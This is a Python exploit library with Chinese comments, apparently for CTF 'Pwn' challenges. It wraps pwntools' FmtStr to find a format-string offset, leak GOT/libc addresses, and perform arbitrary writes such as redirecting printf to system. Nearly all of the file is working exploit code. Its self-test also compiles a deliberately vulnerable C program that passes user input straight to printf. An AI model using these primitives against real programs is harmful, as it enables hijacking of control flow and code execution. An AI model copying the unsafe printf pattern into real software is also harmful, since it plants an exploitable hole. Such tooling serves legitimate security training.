# -*- coding: utf-8 -*-
# 脚本名称: 格式化字符串漏洞利用工具（泄露 + 任意地址写）
# 方向: Pwn（格式化字符串）
# 简介: 封装 pwntools FmtStr：自动探测格式化字符串在栈上的偏移(offset)，
#       任意地址读（泄露 GOT/libc/栈地址）、任意地址写（改 GOT、printf->system、
#       返回地址），并给出手工 %p/%n 探测与 32/64 位 payload 拼接方法。
# 用法（作为库）:
#   from format_string import probe_offset_local, fmt_write, leak_got
#   off = probe_offset_local('./pwn')
#   fmt_write(io, {elf.got['printf']: libc.sym['system']}, off)
# 手工探测:
#   输入  %p.%p.%p.%p.%p.%p.%p.%p   若第 k 个输出等于输入地址则 offset=k
#   AAAA%6$p   -> 回显 0x41414141 则偏移为 6
# 命令行自测: python format_string.py --selftest
# 依赖: pip install pwntools；Linux/WSL/Kali
from pwn import *

context(os="linux", arch="amd64", log_level="warning")


def probe_offset_local(binpath, depth=20):
    """本地反复启动程序，逐个偏移测试 AAAA%k$p 是否回显 0x41414141。"""
    for k in range(1, depth + 1):
        io = process(binpath)
        try:
            io.sendline(b"AAAA%%%d$p" % k)
            data = io.recvall(timeout=2)
        except Exception:
            data = b""
        io.close()
        if b"0x41414141" in data or b"0x42414141" in data:
            return k
    return None


def fmt_write(io, writes, offset, send_suffix=b"\n", numbwritten=0):
    """writes: {addr: value}，用 pwntools 自动生成 %n/hhn 写原语。"""
    def send(payload):
        io.send(payload + send_suffix)
        try:
            return io.recvuntil(b"\n", timeout=2)
        except Exception:
            return b""
    fmt = FmtStr(send, offset=offset, numbwritten=numbwritten)
    for addr, value in writes.items():
        fmt.write(addr, value)
    fmt.execute_writes()


def leak_got(io, elf, offset, name, prompt=b""):
    """泄露某个 GOT 表项地址（64 位）。"""
    payload = b"LEAK%%%d$s||||" % offset
    payload = payload.ljust(24, b"X") + p64(elf.got[name])
    if prompt:
        io.sendlineafter(prompt, payload)
    else:
        io.sendline(payload)
    data = io.recvuntil(b"||||", drop=True)
    i = data.find(b"LEAK") + 4
    seg = data[i:]
    if seg == b"(null)":
        return 0
    return u64(seg[:6].ljust(8, b"\x00"))


def selftest():
    import os
    import sys
    if sys.platform != "linux":
        print("[-] 本自测需 Linux 环境（gcc 生成 ELF + pwntools），Windows/macOS 跳过")
        return
    import subprocess
    import tempfile
    d = tempfile.mkdtemp()
    src = os.path.join(d, "f.c")
    binp = os.path.join(d, "fmt")
    open(src, "w").write(r'''
#include <stdio.h>
#include <unistd.h>
int main(){
  char b[256];
  setvbuf(stdout,0,2,0);
  for(int i=0;i<4;i++){
    int n=read(0,b,255); if(n<=0)break; b[n]=0;
    printf(b); puts(""); fflush(stdout);
  }
  return 0;
}
''')
    cc = subprocess.run(["gcc", "-no-pie", "-fno-stack-protector", "-o", binp, src],
                        capture_output=True, text=True)
    if cc.returncode != 0:
        print("[-] 需要 gcc（Linux/WSL/Kali），跳过编译自测:", cc.stderr[:150]); return
    off = probe_offset_local(binp)
    assert off, "未探测到偏移"
    print(f"[+] 格式化字符串偏移 = {off}")
    io = process(binp)
    io.sendline(b"|".join(b"%%%d$p" % i for i in range(1, 10)))
    data = io.recvline(timeout=3)
    assert b"0x" in data, data
    io.close()
    print("[+] selftest OK（探测+泄露链路可用，任意写按 fmt_write 模板改）")


if __name__ == "__main__":
    import sys
    if "--selftest" in sys.argv:
        selftest()
    else:
        print(__doc__)
